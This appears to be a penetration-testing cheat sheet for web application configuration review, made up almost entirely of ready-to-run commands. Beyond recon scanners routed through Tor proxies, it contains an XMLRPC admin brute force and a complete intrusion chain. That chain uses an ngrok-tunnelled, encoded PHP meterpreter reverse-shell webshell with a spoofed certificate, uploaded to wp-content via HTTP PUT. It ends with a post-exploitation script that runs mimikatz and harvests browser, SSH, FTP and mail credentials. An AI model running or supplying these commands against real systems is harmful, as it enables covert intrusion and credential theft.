# App Platform Configuration

## Check List

* [ ] Ensure that defaults and known files have been removed.
* [ ] Validate that no debugging code or extensions are left in the production environments.
* [ ] Review the logging mechanisms set in place for the application.

## Methodology

#### TOR Technique for Finding Sensitive Routes

{% stepper %}
{% step %}
Using the following command that works with the <sub>TOR</sub> tool, it creates 20 independent Tor proxies (SOCKS + control) for the debian-tor user and places them behind <sub>Privoxy</sub> so programs can use them. And it makes it easier for an attacker to send requests to the server
{% endstep %}

{% step %}
Using the next command, we scan the web server to find out what features it has and get a list of the web server's features
{% endstep %}

{% step %}
Then, using the following commands, we get a list of target subdomains and then using the <sub>HTTPX tool</sub> command, we check whether the subdomains we got are active
{% endstep %}

{% step %}
And we can use the next command to find out the open ports of all active subdomains
{% endstep %}

{% step %}
Using the Katana tool command, we crawl all pages and find the target points and files
{% endstep %}

{% step %}
Using the Katana tool command, we crawl all the pages and find the target points and files, and then we run it using the Grep command to find and show us if there is a sensitive file in our crawl output
{% endstep %}

{% step %}
And then using the Dirsearch tool command, which we run on all the subdomains that are hit, to find all the sensitive paths or even sensitive files that could expose information about users or the web server
{% endstep %}

{% step %}
Using the Nuclei command, we can find vulnerabilities and <sub>CVEs</sub> on the target to identify the presence of vulnerabilities, and using the next commands, we can run commands related to the target's use of different <sub>CMSs</sub> on the target
{% endstep %}
{% endstepper %}

***

## Cheat Sheet

### **Sample And Known Files And Directories**

#### [Multitor](https://github.com/trimstray/multitor)

{% hint style="info" %}
20 Tor Tunnel
{% endhint %}

```bash
multitor --init 20 \
         --user debian-tor \
         --socks-port 9000 \
         --control-port 9900 \
         --proxy privoxy
```

#### [Nikto](https://github.com/sullo/nikto)

{% hint style="info" %}
Scan Web Server
{% endhint %}

```bash
nikto -h $WEBSITE
```

#### [SubFinder](https://github.com/projectdiscovery/subfinder)

{% hint style="info" %}
Subdomain Fuzzing
{% endhint %}

```bash
subfinder -d $WEBSITE -o /tmp/subdomains.txt
```

#### [ShuffleDNS](https://github.com/projectdiscovery/shuffledns)

{% hint style="info" %}
Resolve Subdomains
{% endhint %}

```bash
echo "1.1.1.1" > /tmp/resolvers.txt
shuffledns -d $WEBSITE \
           -l /tmp/subdomains.txt \
           -r /tmp/resolvers.txt \
           -mode resolve \
           -o /tmp/alive-subdomains.txt
```

#### [Httpx](https://github.com/projectdiscovery/httpx)

{% hint style="info" %}
Check Http Live
{% endhint %}

```bash
cat /tmp/sub-domains.txt | \
httpx -silent -sc -probe -title -td -ip \
      -mc 200,404,403,302,301,303,304,305,306,307,302 \
      -o /tmp/sub-domains.txt
```

#### [Httpx-Toolkit](https://github.com/projectdiscovery/httpx)

{% hint style="info" %}
Find Alive Ports
{% endhint %}

```bash
httpx-toolkit -l /tmp/alive-subdomains.txt \
              -ports 80,443,8080,8000,8888,8082,8083 \
              -o /tmp/alive-sub-and-ports.txt
```

#### [Katana](https://github.com/projectdiscovery/katana)

{% hint style="info" %}
Find Source URLs
{% endhint %}

```bash
katana -u /tmp/alive-subdomains.txt \
       -d 5 -ps \
       -pss waybackarchive,commoncrawl,alienvault \
       -kf -jc -fx \
       -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg \
       -o /tmp/all-urls.txt
```

#### [Grep](https://www.gnu.org/s/grep/manual/grep.html)

{% hint style="info" %}
Find Sensitive Infos
{% endhint %}

```bash
cat /tmp/all-urls.txt | \
grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5'
```

#### [Dirsearch](https://github.com/maurosoria/dirsearch)

{% hint style="info" %}
Directory Fuzzing
{% endhint %}

```bash
dirsearch -l /tmp/sub-domains.txt \
          -t 150 -x 403,404,500,429 -i 200,301,302 
          --random-agent 
```

#### [Nuclei](https://github.com/projectdiscovery/nuclei)

{% hint style="info" %}
List all Tags
{% endhint %}

```bash
nuclei -tgl
```

{% hint style="info" %}
Scan OSINT & Recon
{% endhint %}

```bash
nuclei -u $WEBSITE -tags osint enum recon
```

{% hint style="info" %}
Scan CVEs & Vulnerabilities
{% endhint %}

```bash
nuclei -u $WEBSITE -tags cves detect vulnerabilities
```

{% hint style="info" %}
Scan CVEs with Multitor
{% endhint %}

```bash
nuclei -u $WEBSITE -tags cves detect vulnerabilities -proxy socks4://127.0.0.1:16379
```

{% hint style="info" %}
Scan Misconf & Panel
{% endhint %}

```bash
nuclei -u $WEBSITE -tags exposure misconfig disclosure tech panel
```

{% hint style="info" %}
XSS & SQLi & LFI & RCE & SSRF
{% endhint %}

```bash
nuclei -u $WEBSITE -tags xss lfi sqli ssrf traversal fileupload rce unauth deserialization
```

#### [WPScan](https://github.com/wpscanteam/wpscan)

{% hint style="info" %}
Scan General
{% endhint %}

```bash
wpscan --url $WEBSITE --rua --api-token $TOKEN
```

{% hint style="info" %}
Scan with Multitor
{% endhint %}

```bash
wpscan --url $WEBSITE --rua --api-token $TOKEN --proxy socks4://127.0.0.1:16379
```

{% hint style="info" %}
Enum Users
{% endhint %}

```bash
wpscan --url $WEBSITE --rua --api-token $TOKEN -e u, m
```

{% hint style="info" %}
Enum Plugins
{% endhint %}

```bash
wpscan --url $WEBSITE --rua --api-token $TOKEN -e ap, vp, p
```

{% hint style="info" %}
Enum Themes
{% endhint %}

```bash
wpscan --url $WEBSITE --rua --api-token $TOKEN -e at, vt, t
```

{% hint style="info" %}
Enum Config Backups
{% endhint %}

```bash
wpscan --url $WEBSITE --rua --api-token $TOKEN -e cb, dbe, tt
```

#### [WPProbe](https://github.com/Chocapikk/wpprobe)

{% hint style="info" %}
Enum Plugins
{% endhint %}

```bash
sudo wpprobe scan -u $WEBSITE --mode hybrid
```

#### [Joomscan](https://github.com/OWASP/joomscan)

{% hint style="info" %}
Scan General
{% endhint %}

```bash
joomscan -u $WEBSITE --random-agent
```

{% hint style="info" %}
Scan with Multitor
{% endhint %}

```bash
joomscan -u $WEBSITE --random-agent --proxy socks4://127.0.0.1:16379
```

{% hint style="info" %}
Enum Endpoints
{% endhint %}

```bash
joomscan -u $WEBSITE --random-agent -ec
```

#### [Droopescan](https://github.com/SamJoan/droopescan)

{% hint style="info" %}
Scan General
{% endhint %}

```bash
droopescan scan drupal -u $WEBSITE
```

{% hint style="info" %}
Enum Endpoints
{% endhint %}

```bash
droopescan scan drupal -u $WEBSITE --enumerate a
```

#### [Drupwn](https://github.com/immunIT/drupwn)

{% hint style="info" %}
Scan General
{% endhint %}

```bash
drupwn --mode exploit --target $WEBSITE
```

{% hint style="info" %}
Enum Endpoints
{% endhint %}

```bash
drupwn --mode enum --modules --target $WEBSITE
```

{% hint style="info" %}
Enum Users
{% endhint %}

```bash
drupwn --mode enum --users --target $WEBSITE
```

#### [SPartan](https://github.com/sensepost/SPartan)

{% hint style="info" %}
Scan SharePoint
{% endhint %}

```bash
spartan -u $WEBSITE --sps --users -s
```

#### [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

{% hint style="info" %}
Scan & Enum IIS
{% endhint %}

```bash
iis_shortname_scanner 2 20 $WEBSITE
```

#### [Swagger Jacker](https://github.com/BishopFox/sj)

{% hint style="info" %}
Scan API
{% endhint %}

```bash
sj brute -u $WEBSITE --randomize-user-agent
```

{% hint style="info" %}
Scan Permission v1
{% endhint %}

```bash
sj automate -u $WEBSITE/swagger/v1/swagger.json --randomize-user-agent
```

{% hint style="info" %}
Scan Permission v2
{% endhint %}

```bash
sj automate -u $WEBSITE/v2/swagger.json --randomize-user-agent
```

### **Comment Review**

#### [Katana](https://github.com/projectdiscovery/katana)

{% hint style="info" %}
HTML Sources
{% endhint %}

```bash
katana -u $WEBSITE 
```

{% hint style="info" %}
JS Sources
{% endhint %}

```bash
katana -u $WEBSITE | grep "\.js$"
```

{% hint style="info" %}
CSS Sources
{% endhint %}

```bash
katana -u $WEBSITE | grep "\.css*"
```

### **System Configuration**

#### [Lynis (Linux)](https://github.com/CISOfy/lynis)

```bash
lynis
```

#### [Hardentools (Windows)](https://github.com/hardentools/hardentools)

```bash
hardentools-cli.exe
```

### **Configuration Review**

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
HTTP Methods
{% endhint %}

```bash
nmap -sS -sV --mtu 5000 --script http-methods $WEBSITE
```

#### [Metasploit](https://www.metasploit.com/)

{% hint style="info" %}
PingBack XMLRPC
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/http/wordpress_pingback_access;
    set RHOSTS $WEBSITE;
    set RPORT 443;
    set SSL true;
    run;
    exit"
```

{% hint style="info" %}
Brute force XMLRPC with Multitor
{% endhint %}

```bash
msfconsole -qx "
    use scanner/http/wordpress_xmlrpc_login;
    set RHOSTS $WEBSITE;
    set RPORT 443;
    set SSL true;
    set USERNAME admin;
    set PASS_FILE /usr/share/seclists/Passwords/darkweb2017-top10000.txt;
    set THREADS 10;
    set STOP_ON_SUCCESS true;
    set Proxies socks4:127.0.0.1:16379;
    run;
    exit"
```

{% hint style="info" %}
Scan PUT Methods
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/http/http_put;
    set RHOSTS $WEBSITE;
    set RPORT 443;
    set SSL true;
    set PATH /wp-content/uploads;
    run -j"
```

{% hint style="info" %}
Start Ngrok
{% endhint %}

```bash
ngrok tcp 4444 >/dev/null 2>&1 &
```

{% hint style="info" %}
Define ENV Ngrok
{% endhint %}

```bash
NGINFO=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels); \
NGHOST=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/([^"]*):.*/\1/p'); \
NGPORT=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/.*.tcp.*.ngrok.io:([^"]*).*/\1/p')
```

{% hint style="info" %}
Cert Spoof
{% endhint %}

```bash
rm -rf /home/$USER/.msf4/loot/*
msfconsole -qx "
    use auxiliary/gather/impersonate_ssl;
    set RHOSTS google.com;
    run;
    exit"
```

{% hint style="info" %}
Define ENV Cert
{% endhint %}

```bash
CERT=/home/$USER/.msf4/loot/$(find /home/$USER/.msf4/loot/ -type f -name "*.pem" -printf "%f\n" | head -n 1)
```

{% hint style="info" %}
Post-EXP
{% endhint %}

```bash
cat > /tmp/post-exp.rc << EOF
getprivs
getsystem
run multi/gather/firefox_creds DECRYPT=true
run multi/gather/filezilla_client_cred
run multi/gather/ssh_creds
run multi/gather/thunderbird_creds
run multi/gather/wlan_geolocate
mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
bg
EOF
```

{% hint style="info" %}
Generate Webshell
{% endhint %}

```bash
msfvenom -p php/meterpreter/reverse_tcp \
         LHOST=$NGHOST \
         PORT=$NGPORT \
         HandlerSSLCert=$CERT \
         StagerVerifySSLCert=true \
         PayloadUUIDTracking=true \
         PayloadUUIDName=StagedPHP \
         EnableStageEncoding=true \
         -f raw \
         -e php/base64 \
         -i 3 \
         -o /tmp/unk9vvn.php; \
sed -i "s#eval#<?php eval#g" /tmp/unk9vvn.php; \
sed -i "s#));#)); ?>#g" /tmp/unk9vvn.php
```

{% hint style="info" %}
Listening Metasploit
{% endhint %}

```bash
msfconsole -qx "
    use multi/handler;
    set PAYLOAD php/meterpreter/reverse_tcp;
    set LHOST $NGHOST;
    set LPORT $NGPORT;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

{% hint style="info" %}
Upload Shell PUT Method
{% endhint %}

```bash
curl -v $WEBSITE/wp-content/uploads --upload-file /tmp/unk9vvn.php
```

### **Logging**

#### [Commix](https://github.com/commixproject/commix)

{% hint style="info" %}
Code Injection
{% endhint %}

```bash
commix -u $WEBSITE
```
